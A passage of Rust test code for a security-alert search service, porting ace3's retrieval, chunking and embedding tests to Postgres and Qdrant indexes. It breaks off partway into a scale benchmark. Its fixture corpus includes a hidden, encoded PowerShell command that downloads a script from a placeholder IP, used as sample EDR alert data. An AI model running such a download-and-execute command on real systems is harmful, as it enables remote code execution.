//! ace-search's tests, and where each of ace3's search tests went (PLAN.md 7.11).
//!
//! | ace3 | here |
//! |---|---|
//! | `tests/saq/search/test_retrieval.py` (7) | `postgres::*` and `qdrant::*`, each case under its ace3 name, on both indexes |
//! | `test_sparse_chunking.py` (15) | `sparse_cases`, `chunking_cases`; `the_terms_are_ace3_s` and `the_chunks_are_ace3_s` hold both to ace3's own output |
//! | `test_documents.py` (26) | `documents_cases`: 23 cases. No counterpart for 3: `test_extractor_lookup_walks_mro` (an analysis type is a name here, with no classes to walk), `test_context_documents` (no module attaches `llm_context_documents`), `test_email_extractor_keeps_html_html2text_cannot_convert` (no `html2text`: the tags are dropped) |
//! | `test_index.py` (25) | `index_cases`: 9 cases, `TestPointId`'s 2 of 3, `TestBuildPoints` (3), `TestWritePoints`' 2 of 3, `test_delete_alert_without_collection` and `test_missing_alert_is_skipped`. No counterpart for 16: a root's id is always a uuid (`test_non_uuid_root`); `TestCollection` (3) and `TestEnsureCollectionRace` (7) are Qdrant's collection, which a migration's table replaces; `test_incomplete_delete_raises` is Qdrant's update status, a transaction here; `test_update_alert_payload_uses_set_payload_with_filter` is the payload, which a join replaces, and the comparison's `update_payload` runs it for real; `test_unloadable_alert_is_skipped` and `test_corrupt_alert_still_raises` are an alert's storage directory, which a root's rows replace; `test_to_utc_iso` is the payload's date |
//! | `test_model.py` (11) | `the_model_loads_only_its_pinned_files` and `the_model_embeds_as_ace3_s_does`. Its 11 cases are the download, its lock and its staging directory: ace-rs downloads nothing at run time |
//! | `test_service.py` (34) | `the_indexer_indexes_what_a_completed_pass_left_due` and `ace-service`'s `the_indexer_holds_only_its_grant`: a task is taken and done once, a failure is counted and retried and left after three, one completion line. No counterpart for the rest: the Redis list and its failures, the alert lock and its deferrals, the worker processes and their count, the payload and delete tasks, a legacy task's shape, and the model's preparation |
//! | `test_cli.py` (18) | none: ace-rs has no `ace search` command. An alert is indexed when its pass completes, and `search.due` and `search.indexed` are the status |
//! | `tests/saq/engine/test_worker_search_submit.py` (3) | `the_indexer_indexes_what_a_completed_pass_left_due`: the request is a row in the completion's transaction. `test_stalled_redis_times_out_and_is_logged_at_error` has no Redis to stall |
//! | `test_syntax.py`, `test_query.py`, `test_lexical.py`, `test_listing.py` | `ace-service`'s `search_tests`, whose docs map them |
//! | `tests/app/analysis/views/session/test_search_filters.py` (4) | `ace-service`'s `the_lanes_scope_is_the_filters_they_can_apply` |
//! | `tests/aceapi_v2/search/test_router.py` | `ace-api`'s `search_router` |
//! | `tests/aceapi_ai/test_search.py` | none: no step brings ace3's AI API |

use std::path::Path;
use std::sync::{Arc, OnceLock};

use serde_json::Value;

use crate::chunking::{chunk_text, trimmed};
use crate::model::{DIMENSIONS, MAX_SEQUENCE_TOKENS, MODEL_VAR, Model};
use crate::sparse;

/// The model the dev image carries. A test that needs it fails without it: it isn't skipped.
pub(crate) fn model() -> Arc<Model> {
    static MODEL: OnceLock<Arc<Model>> = OnceLock::new();
    MODEL
        .get_or_init(|| {
            let dir = std::env::var(MODEL_VAR).unwrap_or_else(|_| {
                panic!("{MODEL_VAR} isn't set: the dev image sets it to the model it downloaded")
            });
            Model::load(Path::new(&dir)).expect("the pinned model loads")
        })
        .clone()
}

/// What ace3's own code and model made of `tools/ace3/search/cases.json`
/// (`tools/ace3/search/make-reference`).
fn reference() -> Value {
    serde_json::from_str(include_str!("fixtures/ace3-reference.json")).expect("the reference")
}

fn cosine(a: &[f32], b: &[f32]) -> f64 {
    a.iter()
        .zip(b)
        .map(|(x, y)| f64::from(*x) * f64::from(*y))
        .sum()
}

#[test]
fn the_terms_are_ace3_s() {
    let reference = reference();
    let texts = reference["texts"].as_array().expect("texts");
    assert!(texts.len() >= 12);
    for case in texts {
        let text = case["text"].as_str().expect("a text");
        let identifiers: Vec<String> =
            serde_json::from_value(case["identifiers"].clone()).expect("identifiers");
        assert_eq!(sparse::identifiers(text), identifiers, "{text:?}");
        let tokens: Vec<String> = serde_json::from_value(case["tokens"].clone()).expect("tokens");
        assert_eq!(sparse::lexical_tokens(text), tokens, "{text:?}");
        let weights: Vec<(u32, f64)> =
            serde_json::from_value(case["weights"].clone()).expect("weights");
        let ours = sparse::term_weights(text);
        assert_eq!(ours.len(), weights.len(), "{text:?}");
        for ((index, weight), (their_index, their_weight)) in ours.iter().zip(&weights) {
            assert_eq!(index, their_index, "{text:?}");
            assert!((weight - their_weight).abs() < 1e-12, "{text:?}");
        }
    }
}

#[test]
fn the_model_embeds_as_ace3_s_does() {
    let reference = reference();
    assert_eq!(reference["model"]["dimension"], DIMENSIONS);
    assert_eq!(reference["model"]["max_seq_length"], MAX_SEQUENCE_TOKENS);
    let model = model();
    let cases = reference["texts"].as_array().expect("texts");
    let texts: Vec<String> = cases
        .iter()
        .map(|case| case["text"].as_str().expect("a text").to_owned())
        .collect();
    let vectors = model.encode(&texts).expect("embedded");
    assert_eq!(vectors.len(), texts.len());
    for ((case, vector), text) in cases.iter().zip(&vectors).zip(&texts) {
        let theirs: Vec<f32> = serde_json::from_value(case["vector"].clone()).expect("a vector");
        assert_eq!(vector.len(), DIMENSIONS);
        let norm = cosine(vector, vector).sqrt();
        assert!((norm - 1.0).abs() < 1e-4, "{text:?}: length {norm}");
        let similarity = cosine(vector, &theirs);
        assert!(
            similarity > 0.9999,
            "{text:?}: cosine {similarity} with ace3's vector"
        );
        let widest = vector
            .iter()
            .zip(&theirs)
            .map(|(a, b)| (a - b).abs())
            .fold(0f32, f32::max);
        assert!(widest < 2e-3, "{text:?}: a component differs by {widest}");
        // one text alone embeds as it does in a batch
        let alone = model.encode_one(text).expect("embedded");
        assert!(cosine(&alone, vector) > 0.9999, "{text:?}");
        let offsets: Vec<(usize, usize)> =
            serde_json::from_value(case["offsets"].clone()).expect("offsets");
        assert_eq!(
            model.token_offsets(trimmed(text)).expect("tokenized"),
            offsets,
            "{text:?}"
        );
    }
}

#[test]
fn the_chunks_are_ace3_s() {
    let reference = reference();
    let model = model();
    let cases = reference["chunks"].as_array().expect("chunks");
    assert_eq!(cases.len(), 5);
    for case in cases {
        let text = trimmed(case["text"].as_str().expect("a text"));
        let offsets = model.token_offsets(text).expect("tokenized");
        let chunks = chunk_text(
            text,
            &offsets,
            usize::try_from(case["chunk_tokens"].as_u64().expect("a size")).expect("small"),
            usize::try_from(case["overlap"].as_u64().expect("an overlap")).expect("small"),
            usize::try_from(case["max_chunks"].as_u64().expect("a cap")).expect("small"),
            case["title"].as_str(),
        )
        .expect("chunked");
        let ours: Vec<(usize, String, usize)> = chunks
            .into_iter()
            .map(|chunk| (chunk.index, chunk.text, chunk.token_count))
            .collect();
        let theirs: Vec<(usize, String, usize)> =
            serde_json::from_value(case["result"].clone()).expect("chunks");
        assert_eq!(ours, theirs, "{case}");
    }
}

// ---------------------------------------------------------------------------------------------------
// ace3's retrieval regression, `tests/saq/search/test_retrieval.py`, against both indexes.
//
// A labeled corpus of eight alerts is written to a test database, indexed with the real model, and
// queried through the public search functions (`Service::search_alerts`, `Service::similar_alerts`).
// `postgres` runs every case against `PgIndex`; `qdrant` runs the same cases, through the same code,
// with ace3's Qdrant index behind the service, and is ignored unless `ACE_RS_TEST_QDRANT_URL` names a
// Qdrant to use: `tools/search/compare` starts one of ace3's version in a project of its own and
// runs them. Each case is ace3's of the same name.
//
// What the corpus is here: ace3 builds each alert through its analysis classes and its ORM. Here each
// is rows of the tree: a root, its observables, the results that hold its text (an email's analysis
// with its body in the bucket, a command line's, a QR code's), its detections and its tags. ace3's
// `alert_type` filter is the Queue filter here, since a root has no alert type: the EDR alert is in
// the queue `edr`. The vendor alert's comment is handed to the indexer as a comment document, since
// ace-rs's alerts have no comments yet.
// ---------------------------------------------------------------------------------------------------

use std::collections::BTreeMap;
use std::time::Instant;

use ace_core::bucket::{ALERT_FILES, Bucket, BucketSettings, Hold};
use ace_core::eligibility::Catalog;
use ace_core::modes::Modes;
use ace_core::orchestrator::Orchestrator;
use ace_core::testing::TestDb;
use ace_service::search::{SearchConfig, SearchIndex, SearchRequest, SimilarRequest, Tier};
use ace_service::{Actor, FilterEntry, Service, UserId};
use ace_store::{BucketConfig, NodeCache, Store};
use serde_json::json;
use uuid::Uuid;

use crate::documents::Document;
use crate::pg::PgIndex;
use crate::qdrant::QdrantIndex;

const SHA256_HEX: &str = "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08";
/// The variable that names the comparison's Qdrant, such as `http://qdrant:6333`.
const QDRANT_VAR: &str = "ACE_RS_TEST_QDRANT_URL";

#[derive(Clone, Copy, PartialEq, Eq, Debug)]
enum Side {
    Postgres,
    Qdrant,
}

struct Corpus {
    _test_db: TestDb,
    _cache: tempfile::TempDir,
    db: ace_core::Db,
    service: Service,
    actor: Actor,
    pg: PgIndex,
    qdrant: Option<QdrantIndex>,
    side: Side,
    alerts: BTreeMap<&'static str, Uuid>,
    /// The comment document of the alert that has one.
    comments: BTreeMap<Uuid, Vec<Document>>,
}

impl Corpus {
    fn name(&self, id: Uuid) -> String {
        self.alerts
            .iter()
            .find(|(_, alert)| **alert == id)
            .map_or_else(|| id.to_string(), |(name, _)| (*name).to_owned())
    }

    async fn index(&self, name: &str) -> usize {
        let root = self.alerts[name];
        let given = self.comments.get(&root).cloned().unwrap_or_default();
        let indexed = match &self.qdrant {
            Some(qdrant) => qdrant.index_alert(root, &given).await,
            None => self.pg.index_alert(root, &given).await,
        }
        .expect("indexed");
        assert!(
            indexed.skipped.is_none() && indexed.chunks > 0,
            "{indexed:?}"
        );
        indexed.chunks
    }

    async fn count(&self) -> u64 {
        match &self.qdrant {
            Some(qdrant) => qdrant.count().await.expect("counted"),
            None => u64::try_from(self.pg.count().await.expect("counted")).expect("a count"),
        }
    }

    async fn search(
        &self,
        query: &str,
        limit: u32,
        filters: Vec<FilterEntry>,
    ) -> ace_service::SearchResponse {
        self.service
            .search_alerts(
                &self.actor,
                &SearchRequest {
                    query: query.to_owned(),
                    filters,
                    limit,
                    ..SearchRequest::default()
                },
            )
            .await
            .expect("searched")
    }

    fn report(&self, query: &str, response: &ace_service::SearchResponse) -> String {
        let results: Vec<String> = response
            .results
            .iter()
            .map(|r| {
                format!(
                    "{}:{}[{}]",
                    r.rank,
                    self.name(r.alert.id),
                    r.tier.map_or("-", Tier::as_str)
                )
            })
            .collect();
        format!(
            "{:?}: {query:?} -> {} (warnings {:?})",
            self.side,
            results.join(", "),
            response.warnings
        )
    }

    async fn finish(self) {
        if let Some(qdrant) = &self.qdrant {
            qdrant.drop_collection().await.expect("dropped");
        }
    }
}

async fn insert_observable(
    db: &ace_core::Db,
    root: Uuid,
    kind: &str,
    value: &str,
    tags: &[&str],
) -> i64 {
    let tags: Vec<String> = tags.iter().map(|tag| (*tag).to_owned()).collect();
    sqlx::query_scalar(
        "INSERT INTO analysis.observables (root_id, type, value, tags) VALUES ($1, $2, $3, $4)
         ON CONFLICT (root_id, type, value_hash) DO UPDATE SET tags = EXCLUDED.tags RETURNING id",
    )
    .bind(root)
    .bind(kind)
    .bind(value)
    .bind(tags)
    .fetch_one(db.pool())
    .await
    .expect("an observable")
}

async fn insert_result(
    db: &ace_core::Db,
    root: Uuid,
    observable: i64,
    kind: &str,
    details: serde_json::Value,
) -> i64 {
    sqlx::query_scalar(
        "INSERT INTO analysis.results (root_id, observable_id, module, analysis_type, schema_version, details)
         VALUES ($1, $2, $3, $3, 1, $4) RETURNING id",
    )
    .bind(root)
    .bind(observable)
    .bind(kind)
    .bind(details)
    .fetch_one(db.pool())
    .await
    .expect("a result")
}

async fn insert_detection(db: &ace_core::Db, root: Uuid, observable: i64, description: &str) {
    sqlx::query(
        "INSERT INTO analysis.detections (root_id, observable_id, description) VALUES ($1, $2, $3)",
    )
    .bind(root)
    .bind(observable)
    .bind(description)
    .execute(db.pool())
    .await
    .expect("a detection");
}

/// A file a result added: its bytes in the bucket, its observable, its path, and the addition.
async fn insert_added_file(
    db: &ace_core::Db,
    bucket: &Bucket,
    root: Uuid,
    result: Option<i64>,
    path: &str,
    bytes: &[u8],
    yara_meta: &[&str],
) -> i64 {
    let put = bucket
        .put_bytes(
            ALERT_FILES,
            bytes,
            Some(&Hold::new("root", root.to_string())),
        )
        .await
        .expect("stored");
    let observable = insert_observable(db, root, "file", &put.object.sha256.to_hex(), &[]).await;
    let yara_meta: Vec<String> = yara_meta.iter().map(|tag| (*tag).to_owned()).collect();
    sqlx::query(
        "INSERT INTO analysis.files (root_id, observable_id, path, yara_meta) VALUES ($1, $2, $3, $4)
         ON CONFLICT DO NOTHING",
    )
    .bind(root)
    .bind(observable)
    .bind(path)
    .bind(yara_meta)
    .execute(db.pool())
    .await
    .expect("a file");
    if let Some(result) = result {
        sqlx::query(
            "INSERT INTO analysis.result_additions (root_id, result_id, observable_id, path)
             VALUES ($1, $2, $3, $4)",
        )
        .bind(root)
        .bind(result)
        .bind(observable)
        .bind(path)
        .execute(db.pool())
        .await
        .expect("an addition");
    }
    observable
}

/// ace3's `_alert`: an alert `seconds` after the corpus began, so the corpus has an order.
async fn insert_alert(
    db: &ace_core::Db,
    description: &str,
    alert_type: &str,
    queue: &str,
    seconds: i32,
) -> Uuid {
    let root = Uuid::new_v4();
    sqlx::query(
        "INSERT INTO analysis.roots (id, analysis_mode, description, event_time_source, alerted_at, queue, origin)
         VALUES ($1, 'correlation', $2, 'unset', now() - interval '1 hour' + make_interval(secs => $3), $4, $5)",
    )
    .bind(root)
    .bind(description)
    .bind(f64::from(seconds))
    .bind(queue)
    .bind(json!({"alert_type": alert_type, "tool": "test_tool"}))
    .execute(db.pool())
    .await
    .expect("an alert");
    root
}

/// ace3's `_email`.
async fn email(
    db: &ace_core::Db,
    bucket: &Bucket,
    root: Uuid,
    sender: &str,
    recipient: &str,
    subject: &str,
    body: &str,
) {
    let message = format!("From: {sender}\nTo: {recipient}\nSubject: {subject}\n\n{body}\n");
    let file = insert_added_file(
        db,
        bucket,
        root,
        None,
        "email.rfc822",
        message.as_bytes(),
        &[],
    )
    .await;
    let result = insert_result(
        db,
        root,
        file,
        "email_analysis",
        json!({"parsing_error": null, "extraction_errors": [], "email": {
            "from": sender, "to": [recipient], "subject": subject, "decoded_subject": subject, "headers": [],
        }}),
    )
    .await;
    insert_added_file(
        db,
        bucket,
        root,
        Some(result),
        "email.rfc822.unknown_text_plain_000",
        body.as_bytes(),
        &["type=email.attachment"],
    )
    .await;
    insert_observable(db, root, "email_address", sender, &[]).await;
    insert_observable(db, root, "email_address", recipient, &[]).await;
}

/// ace3's `corpus`: the eight alerts, indexed.
async fn corpus(side: Side) -> Corpus {
    let test_db = TestDb::new().await;
    let db = test_db.db().clone();
    let cache = tempfile::tempdir().expect("a cache directory");
    let store = Store::new(
        &BucketConfig::from_env().expect("the ACE_RS_BUCKET_* variables"),
        NodeCache::new(cache.path(), 1 << 30).expect("a cache"),
    )
    .await;
    let bucket = Bucket::new(db.clone(), store, BucketSettings::default());
    let pg = PgIndex::new(db.clone(), Some(bucket.clone()), model());
    let qdrant = match side {
        Side::Postgres => None,
        Side::Qdrant => {
            let url = std::env::var(QDRANT_VAR)
                .unwrap_or_else(|_| panic!("{QDRANT_VAR} names the comparison's Qdrant"));
            let collection = format!("ace-rs-test-{}", &Uuid::new_v4().simple().to_string()[..8]);
            Some(
                QdrantIndex::create(&url, &collection, pg.clone(), db.clone())
                    .await
                    .expect("a collection"),
            )
        }
    };
    let index: Arc<dyn SearchIndex> = match &qdrant {
        Some(qdrant) => Arc::new(qdrant.clone()),
        None => Arc::new(pg.clone()),
    };
    let service = Service::new(
        db.clone(),
        Orchestrator::new(Catalog::new(vec![]), Modes::ace3()),
    )
    .with_search(index, SearchConfig::default());
    let id = UserId(Uuid::from_u128(0xAD));
    sqlx::query(
        "INSERT INTO service.users (id, username, password_hash, created_by)
         VALUES ($1, 'analyst', '$argon2id$none', '{\"kind\": \"internal\", \"id\": \"test\"}')",
    )
    .bind(id.0)
    .execute(db.pool())
    .await
    .expect("a user");
    sqlx::query(
        "INSERT INTO service.permissions (user_id, major, minor, effect, created_by)
         VALUES ($1, 'alert', 'read', 'allow', '{\"kind\": \"internal\", \"id\": \"test\"}')",
    )
    .bind(id.0)
    .execute(db.pool())
    .await
    .expect("a grant");
    let actor = Actor::User {
        id,
        name: "analyst".to_owned(),
    };

    let mut alerts = BTreeMap::new();
    let mut comments = BTreeMap::new();

    let root = insert_alert(
        &db,
        "Suspicious email - DocuSign invoice",
        "phish",
        "default",
        1,
    )
    .await;
    email(&db, &bucket, root, "billing@docusign-invoices.example", "bob@example.com",
        "Your DocuSign invoice is ready",
        "Please review and sign the attached invoice before the end of the day. Click the link to view the document.").await;
    alerts.insert("docusign", root);

    let root = insert_alert(&db, "EDR - encoded PowerShell download", "edr", "edr", 2).await;
    let command = insert_observable(&db, root, "command_line",
        "powershell.exe -nop -w hidden -enc SQBFAFgA (New-Object Net.WebClient).DownloadString('http://10.20.30.40/a.ps1')", &[]).await;
    insert_result(
        &db,
        root,
        command,
        "command_line_analysis",
        json!({"file_paths": [], "base64_payloads": []}),
    )
    .await;
    insert_observable(&db, root, "ipv4", "10.20.30.40", &[]).await;
    alerts.insert("powershell", root);

    let root = insert_alert(
        &db,
        "Sandbox - malicious executable detonated",
        "sandbox",
        "default",
        3,
    )
    .await;
    let hash = insert_observable(&db, root, "sha256", SHA256_HEX, &[]).await;
    insert_detection(
        &db,
        root,
        hash,
        "file matched yara rule Win32_Trojan_Generic",
    )
    .await;
    alerts.insert("malware", root);

    let root = insert_alert(
        &db,
        "Suspicious email - HR newsletter",
        "phish",
        "default",
        4,
    )
    .await;
    email(&db, &bucket, root, "hr@example.com", "all@example.com", "September wellness newsletter",
        "Join us for the quarterly wellness fair with yoga sessions and healthy snacks in the cafeteria.").await;
    alerts.insert("newsletter", root);

    let root = insert_alert(
        &db,
        "VPN - brute force from external ip",
        "vpn",
        "default",
        5,
    )
    .await;
    let address =
        insert_observable(&db, root, "ipv4", "203.0.113.7", &["credential-harvest"]).await;
    insert_detection(
        &db,
        root,
        address,
        "200 failed vpn logins from 203.0.113.7 in ten minutes",
    )
    .await;
    alerts.insert("vpn", root);

    let root = insert_alert(&db, "Suspicious email - QR code", "phish", "default", 6).await;
    let image = insert_added_file(
        &db,
        &bucket,
        root,
        None,
        "qr.png",
        b"\x89PNG not really an image 0001",
        &[],
    )
    .await;
    insert_result(
        &db,
        root,
        image,
        "qr_code_analysis",
        json!({"extracted_text": "https://mfa-reset.example/login?user=bob", "inverted": false}),
    )
    .await;
    alerts.insert("qr", root);

    let root = insert_alert(
        &db,
        "Suspicious email - marketing blast",
        "phish",
        "default",
        7,
    )
    .await;
    insert_observable(&db, root, "fqdn", "mailer.example.net", &[]).await;
    comments.insert(
        root,
        vec![
            Document::comment(
                "1",
                Some("analyst"),
                "confirmed false positive, this is the vendor mailer we whitelisted last month",
            )
            .expect("a comment"),
        ],
    );
    alerts.insert("vendor", root);

    let root = insert_alert(
        &db,
        "Suspicious email - DocuSign invoice",
        "phish",
        "default",
        8,
    )
    .await;
    email(
        &db,
        &bucket,
        root,
        "noreply@dokusign-secure.example",
        "alice@example.com",
        "Your DocuSign invoice is ready",
        "An invoice has been shared with you. Review and sign the document at the link below.",
    )
    .await;
    alerts.insert("docusign2", root);

    let corpus = Corpus {
        _test_db: test_db,
        _cache: cache,
        db,
        service,
        actor,
        pg,
        qdrant,
        side,
        alerts,
        comments,
    };
    let names: Vec<&'static str> = corpus.alerts.keys().copied().collect();
    for name in names {
        corpus.index(name).await;
    }
    corpus
}

/// ace3's `LABELED_QUERIES`: the query, the alerts expected in the top three, and whether an exact
/// match must be first.
const LABELED_QUERIES: &[(&str, &[&str], bool)] = &[
    (
        "docusign invoice phishing",
        &["docusign", "docusign2"],
        false,
    ),
    // an indicator has to be named to be looked up exactly
    ("email_address:bob@example.com", &["docusign"], true),
    ("ipv4:10.20.30.40", &["powershell"], true),
    (
        "sha256:9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
        &["malware"],
        true,
    ),
    ("tag:credential-harvest", &["vpn"], true),
    // the same indicators bare: no exact lookup, but the sparse lane still finds them in the text
    ("bob@example.com", &["docusign"], false),
    ("10.20.30.40", &["powershell"], false),
    ("powershell encoded download", &["powershell"], false),
    ("qr code mfa reset", &["qr"], false),
    ("vendor mailer false positive", &["vendor"], false),
    ("brute force vpn logins", &["vpn"], false),
];

const JUNK_QUERIES: &[&str] = &["asdfghjkl", "the", "banana smoothie recipe", "xyzzy plugh"];

async fn test_labeled_queries(side: Side) {
    let corpus = corpus(side).await;
    let mut failures = Vec::new();
    for (query, expected, exact) in LABELED_QUERIES {
        let response = corpus.search(query, 3, Vec::new()).await;
        let top: Vec<String> = response
            .results
            .iter()
            .map(|r| corpus.name(r.alert.id))
            .collect();
        let line = corpus.report(query, &response);
        if !expected
            .iter()
            .all(|name| top.iter().any(|found| found == name))
        {
            failures.push(format!("recall@3 miss: {line}"));
        }
        if *exact
            && response.results.first().is_none_or(|first| {
                first.tier != Some(Tier::Exact) || !expected.contains(&top[0].as_str())
            })
        {
            failures.push(format!("exact match not first: {line}"));
        }
        assert!(response.warnings.is_empty(), "{line}");
    }
    assert!(failures.is_empty(), "{side:?}:\n{}", failures.join("\n"));
    corpus.finish().await;
}

async fn test_a_bare_indicator_is_not_an_exact_match(side: Side) {
    let corpus = corpus(side).await;
    let tagged = "tag:credential-harvest";
    let named = format!("sha256:{SHA256_HEX}");
    for (bare, named) in [(SHA256_HEX, named.as_str()), ("credential-harvest", tagged)] {
        let response = corpus.search(bare, 5, Vec::new()).await;
        assert_eq!(response.total, 0, "{}", corpus.report(bare, &response));
        let response = corpus.search(named, 5, Vec::new()).await;
        assert_eq!(response.total, 1, "{}", corpus.report(named, &response));
    }
    // and the bare paste is answered with how to name it
    let response = corpus.search(SHA256_HEX, 5, Vec::new()).await;
    assert!(
        response
            .hint
            .is_some_and(|hint| hint.contains("observable:<type>:"))
    );
    corpus.finish().await;
}

async fn test_junk_queries_return_nothing(side: Side) {
    let corpus = corpus(side).await;
    for junk in JUNK_QUERIES {
        let response = corpus.search(junk, 5, Vec::new()).await;
        assert_eq!(response.total, 0, "{}", corpus.report(junk, &response));
        assert!(response.warnings.is_empty());
    }
    corpus.finish().await;
}

async fn test_tiers_reflect_evidence(side: Side) {
    let corpus = corpus(side).await;
    let response = corpus
        .search("docusign invoice phishing", 5, Vec::new())
        .await;
    let top = &response.results[0];
    assert!(["docusign", "docusign2"].contains(&corpus.name(top.alert.id).as_str()));
    assert_eq!(top.tier, Some(Tier::Strong));
    assert!(top.dense_score.expect("a dense score") >= SearchConfig::default().score_threshold);
    assert!(response.results.iter().all(|r| r.tier != Some(Tier::Exact)));
    let response = corpus.search("ipv4:10.20.30.40", 5, Vec::new()).await;
    assert_eq!(response.results[0].tier, Some(Tier::Exact));
    corpus.finish().await;
}

async fn test_filters_narrow_both_lanes(side: Side) {
    let corpus = corpus(side).await;
    let only = corpus
        .search(
            "docusign invoice",
            5,
            vec![FilterEntry::text("Queue", false, &["edr"])],
        )
        .await;
    assert!(
        only.results
            .iter()
            .all(|r| r.alert.id == corpus.alerts["powershell"])
    );
    let without = corpus
        .search(
            "docusign invoice",
            5,
            vec![FilterEntry::text("Queue", true, &["edr"])],
        )
        .await;
    let found = without.alert_ids();
    assert!(
        found.contains(&corpus.alerts["docusign"]) && found.contains(&corpus.alerts["docusign2"])
    );
    assert!(!found.contains(&corpus.alerts["powershell"]));
    corpus.finish().await;
}

async fn test_similar_alerts_finds_the_near_duplicate(side: Side) {
    let corpus = corpus(side).await;
    let response = corpus
        .service
        .similar_alerts(
            &corpus.actor,
            &SimilarRequest {
                limit: 3,
                ..SimilarRequest::of(corpus.alerts["docusign"])
            },
        )
        .await
        .expect("searched");
    let found = response.alert_ids();
    assert!(!found.contains(&corpus.alerts["docusign"]));
    assert!(found.contains(&corpus.alerts["docusign2"]), "{found:?}");
    corpus.finish().await;
}

async fn test_reindex_is_idempotent_and_payload_updates_stick(side: Side) {
    let corpus = corpus(side).await;
    let before = corpus.count().await;
    let chunks = corpus.index("docusign").await as u64;
    assert_eq!(corpus.count().await, before);
    assert!(chunks > 0);

    let docusign = corpus.alerts["docusign"];
    sqlx::query(
        "UPDATE analysis.roots SET disposition = 'DELIVERY', dispositioned_at = now(),
                dispositioned_by = '{\"kind\": \"internal\", \"id\": \"test\"}' WHERE id = $1",
    )
    .bind(docusign)
    .execute(corpus.db.pool())
    .await
    .expect("dispositioned");
    if let Some(qdrant) = &corpus.qdrant {
        // ace3's index copies the disposition onto every point, so it has to be told
        assert!(qdrant.update_payload(docusign).await.expect("updated"));
        let payloads = qdrant.payloads(docusign).await.expect("read");
        assert!(!payloads.is_empty());
        assert!(
            payloads
                .iter()
                .all(|payload| payload["disposition"] == "DELIVERY")
        );
    }
    // the Postgres index reads the alert's own row: there is nothing to refresh
    let response = corpus
        .search(
            "docusign invoice",
            5,
            vec![FilterEntry::text("Disposition", false, &["DELIVERY"])],
        )
        .await;
    assert_eq!(response.alert_ids(), vec![docusign]);

    match &corpus.qdrant {
        Some(qdrant) => qdrant.delete_alert(docusign).await.expect("deleted"),
        None => {
            corpus.pg.delete_alert(docusign).await.expect("deleted");
        }
    }
    assert_eq!(corpus.count().await, before - chunks);
    corpus.finish().await;
}

/// The comparison's numbers (`docs/decisions/0002-search-index.md`): for each labeled query, where
/// its expected alerts ranked and how long the search took, over this side's index. Printed, since
/// they are measurements; the cases above are what has to hold.
async fn measure(side: Side) {
    let corpus = corpus(side).await;
    let mut reciprocal = 0.0;
    let mut recalled = 0;
    let mut expected_total = 0;
    let mut times = Vec::new();
    println!("side\tquery\tranks of the expected\ttop tier\ttop dense\ttotal\tmedian ms");
    for (query, expected, _) in LABELED_QUERIES {
        let mut runs = Vec::new();
        let mut response = corpus.search(query, 3, Vec::new()).await;
        for _ in 0..9 {
            let started = Instant::now();
            response = corpus.search(query, 3, Vec::new()).await;
            runs.push(started.elapsed().as_secs_f64() * 1000.0);
        }
        runs.sort_by(f64::total_cmp);
        let median = runs[runs.len() / 2];
        times.push(median);
        let top: Vec<String> = response
            .results
            .iter()
            .map(|r| corpus.name(r.alert.id))
            .collect();
        let ranks: Vec<String> = expected
            .iter()
            .map(|name| {
                top.iter()
                    .position(|found| found == name)
                    .map_or("-".to_owned(), |at| (at + 1).to_string())
            })
            .collect();
        let first = expected
            .iter()
            .filter_map(|name| top.iter().position(|found| found == name))
            .min();
        reciprocal += first.map_or(0.0, |at| 1.0 / (at + 1) as f64);
        recalled += ranks.iter().filter(|rank| *rank != "-").count();
        expected_total += expected.len();
        let top_result = response.results.first();
        println!(
            "{side:?}\t{query}\t{}\t{}\t{}\t{}\t{median:.1}",
            ranks.join(","),
            top_result.and_then(|r| r.tier).map_or("-", Tier::as_str),
            top_result
                .and_then(|r| r.dense_score)
                .map_or("-".to_owned(), |score| format!("{score:.3}")),
            response.total,
        );
    }
    let mut junk = 0;
    for query in JUNK_QUERIES {
        junk += corpus.search(query, 5, Vec::new()).await.total;
    }
    times.sort_by(f64::total_cmp);
    println!(
        "{side:?}\tsummary\trecall@3 {recalled}/{expected_total}\tMRR {:.3}\tjunk results {junk}\tchunks {}\tmedian of medians {:.1} ms",
        reciprocal / LABELED_QUERIES.len() as f64,
        corpus.count().await,
        times[times.len() / 2],
    );
    corpus.finish().await;
}

macro_rules! retrieval_cases {
    ($($case:ident),* $(,)?) => {
        /// ace3's retrieval regression against the Postgres index.
        mod postgres {
            $(#[tokio::test(flavor = "multi_thread")]
            async fn $case() {
                super::$case(super::Side::Postgres).await;
            })*
        }

        /// The same cases with ace3's Qdrant index behind the service. Ignored unless a Qdrant is given:
        /// `tools/search/compare` runs them.
        mod qdrant {
            $(#[tokio::test(flavor = "multi_thread")]
            #[ignore = "needs ACE_RS_TEST_QDRANT_URL: tools/search/compare starts a Qdrant and runs these"]
            async fn $case() {
                super::$case(super::Side::Qdrant).await;
            })*
        }
    };
}

retrieval_cases!(
    test_labeled_queries,
    test_a_bare_indicator_is_not_an_exact_match,
    test_junk_queries_return_nothing,
    test_tiers_reflect_evidence,
    test_filters_narrow_both_lanes,
    test_similar_alerts_finds_the_near_duplicate,
    test_reindex_is_idempotent_and_payload_updates_stick,
    measure,
);

// ---------------------------------------------------------------------------------------------------
// The comparison at production's size (`docs/decisions/0002-search-index.md`): both indexes loaded with
// the same synthetic chunks, and each lane timed on both. A measurement, run by `tools/search/compare
// --scale`: it asserts only that both sides answered.
// ---------------------------------------------------------------------------------------------------

/// A small generator, so both sides get the same numbers on every run.
struct Numbers(u64);

impl Numbers {
    fn next(&mut self) -> u64 {
        self.0 ^= self.0 << 13;
        self.0 ^= self.0 >> 7;
        self.0 ^= self.0 << 17;
        self.0
    }

    fn unit(&mut self) -> f32 {
        (self.next() >> 40) as f32 / (1u64 << 24) as f32
    }

    /// Roughly normal: four uniforms' sum.
    fn normal(&mut self) -> f32 {
        (self.unit() + self.unit() + self.unit() + self.unit() - 2.0) * 1.732
    }

    fn below(&mut self, n: usize) -> usize {
        usize::try_from(self.next() % n as u64).expect("small")
    }
}

fn normalized(mut vector: Vec<f32>) -> Vec<f32> {
    let norm = vector.iter().map(|v| v * v).sum::<f32>().sqrt().max(1e-12);
    for value in &mut vector {
        *value /= norm;
    }
    vector
}

fn percentile(sorted: &[f64], p: f64) -> f64 {
    sorted[((sorted.len() - 1) as f64 * p).round() as usize]
}

#[tokio::test(flavor = "multi_thread")]
#[ignore = "a measurement at production's size: tools/search/compare --scale runs it"]
async fn scale() {
    use crate::model::DIMENSIONS;
    use ace_service::search::Scoped;

